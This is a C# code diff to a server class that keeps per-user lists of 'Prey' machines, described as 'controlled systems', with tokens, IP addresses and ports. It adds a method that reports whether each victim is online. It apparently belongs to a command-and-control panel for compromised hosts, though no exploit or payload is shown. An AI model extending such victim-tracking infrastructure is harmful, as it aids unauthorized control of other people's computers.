@@ -19,10 +19,10 @@ namespace Alice_server
         //public bool server { get; set; } //как сервер ?
         public bool online { get; set; } //как клиент ?
         public List<Prey> _all_sacrifice { get; set; }  //Список контролируемых систем
-        
+
         public UserClient()
         {
-            
+
         }
         public UserClient(int _ID_USER)
         {
@@ -33,9 +33,9 @@ namespace Alice_server
             this._ID_USER = _ID_USER;
             this._cookies = _cookies;
             this._Login = _Login;
-            
+
         }
-        public UserClient(string _Login, string _cookies, int _ID_USER,List<Prey> _all_sacrifice)
+        public UserClient(string _Login, string _cookies, int _ID_USER, List<Prey> _all_sacrifice)
         {
             this._ID_USER = _ID_USER;
             this._cookies = _cookies;
@@ -57,7 +57,7 @@ namespace Alice_server
                 {
                     str += "[" + _one.Name_sacrifice + "][" +
                               _one.Token_sacrifice + "][" +
-                              _one.online + "][" +
+                              Cheak_status_Prey(_one) + "][" +
                               _one.ip.Address.ToString() + "][" +
                               _one.ip.Port + "]";
 
@@ -68,5 +68,23 @@ namespace Alice_server
         }
 
 
+        public bool Cheak_status_Prey(Prey _one)
+        {
+            for (int i = 0; i < AllPrey.AllPrey_database.Count; i++)
+            {
+                if (Command._ComparePrey(_one, AllPrey.AllPrey_database[i]))
+                {
+                    Console.WriteLine("  2 "+ AllPrey.AllPrey_database[i].Token_sacrifice+ " "+ AllPrey.AllPrey_database[i].online +" "+ AllPrey.AllPrey_database[i].timeonline);
+
+                    if (AllPrey.AllPrey_database[i].online)
+                        return true;
+                    else
+                        return false;
+
+                }
+
+            }
+            return false;
+        }
     }
 }
